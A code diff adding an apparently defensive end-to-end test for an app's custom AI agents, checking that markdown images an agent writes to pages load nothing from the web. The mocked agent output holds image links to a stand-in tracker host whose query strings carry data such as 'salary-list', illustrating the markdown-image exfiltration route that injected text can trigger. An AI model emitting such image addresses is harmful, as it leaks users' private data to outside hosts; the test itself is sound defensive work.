@@ -282,6 +282,81 @@ test.describe('Custom agents', () => {
     await expect.poll(() => wsEval(page, (s, id) => s.pages[id].plain as string, wiki)).toBe(before)
   })
 
+  test('what an agent writes loads no web image: report and applied content get links, workspace images stay', async ({ page, context }) => {
+    // the classic way text an agent read (a mail, a form answer) smuggles data out: an image address
+    const fetched: string[] = []
+    await context.route('https://track.example.test/**', (route) => {
+      fetched.push(route.request().url())
+      return route.fulfill({ status: 200, contentType: 'image/gif', body: '' })
+    })
+    await openApp(page)
+    await setKey(page)
+    const wiki = await pageIdByTitle(page, 'Team wiki')
+    const report = await wsEval(page, (s) => s.createPage({ title: 'Agent log' }) as string)
+    await mockClaude(context, [
+      () =>
+        sseMessage([
+          {
+            type: 'tool_use',
+            id: 'tu1',
+            name: 'append_to_page',
+            input: { id: wiki, markdown: '## Digest\n\n![status](https://track.example.test/a.gif?d=salary-list)\n\n![logo](assets/icons/ai.webp)\n\n`![kept as code](https://track.example.test/code.gif)`' },
+          },
+        ]),
+      () => sseMessage([{ type: 'text', text: 'Done. ![](https://track.example.test/r.gif?d=summary) See [[Team wiki]].' }]),
+    ])
+    const id = await addAgent(page, { id: 'ag-img', name: 'Digest', write: 'apply', scope: { everything: false, pages: [wiki], databases: [] }, output: { pageId: report, mode: 'append' } })
+    await goAgent(page, id)
+    await page.getByRole('button', { name: 'Run now' }).click()
+    await expect(page.locator('.agx-run').first()).toHaveAttribute('data-status', 'ok', { timeout: 20_000 })
+    await expect.poll(() => wsEval(page, (s, id) => s.pages[id].plain as string, wiki)).toContain('Digest')
+
+    const images = (id: string) =>
+      wsEval(
+        page,
+        (s, id) => {
+          const out: string[] = []
+          const walk = (n: AnyState) => (n.type === 'image' && out.push(n.attrs.src), (n.content ?? []).forEach(walk))
+          walk(s.pages[id].content)
+          return out
+        },
+        id,
+      )
+    const links = (id: string) =>
+      wsEval(
+        page,
+        (s, id) => {
+          const out: string[] = []
+          const walk = (n: AnyState) => {
+            for (const m of n.marks ?? []) if (m.type === 'link') out.push(m.attrs.href)
+            ;(n.content ?? []).forEach(walk)
+          }
+          walk(s.pages[id].content)
+          return out
+        },
+        id,
+      )
+    // the applied content: the web image is a link now; the workspace's own image and code are left as they were
+    expect((await images(wiki)).filter((src) => /^(https?:)?\/\//.test(src))).toEqual([])
+    expect(await links(wiki)).toContain('https://track.example.test/a.gif?d=salary-list')
+    expect(await wsEval(page, (s, id) => s.pages[id].plain as string, wiki)).toContain('![kept as code](https://track.example.test/code.gif)')
+    // the report page and the stored run: no image either
+    await expect.poll(() => links(report)).toContain('https://track.example.test/r.gif?d=summary')
+    expect(await images(report)).toEqual([])
+    const [rec] = await waitRuns(page, id, 1)
+    expect(rec.summary).not.toContain('![')
+    expect(rec.staged[0].markdown).not.toContain('![status]')
+    expect(rec.staged[0].markdown).toContain('![logo](assets/icons/ai.webp)')
+
+    // opening both pages fetches nothing from the tracker
+    for (const p of [wiki, report]) {
+      await page.evaluate((id) => (window.location.hash = `#/p/${id}`), p)
+      await expect(page.locator('#main .pv-title')).toBeVisible()
+    }
+    await page.waitForTimeout(800)
+    expect(fetched).toEqual([])
+  })
+
   test('scope: a tool call for a page outside the scope is refused', async ({ page, context }) => {
     await openApp(page)
     await setKey(page)
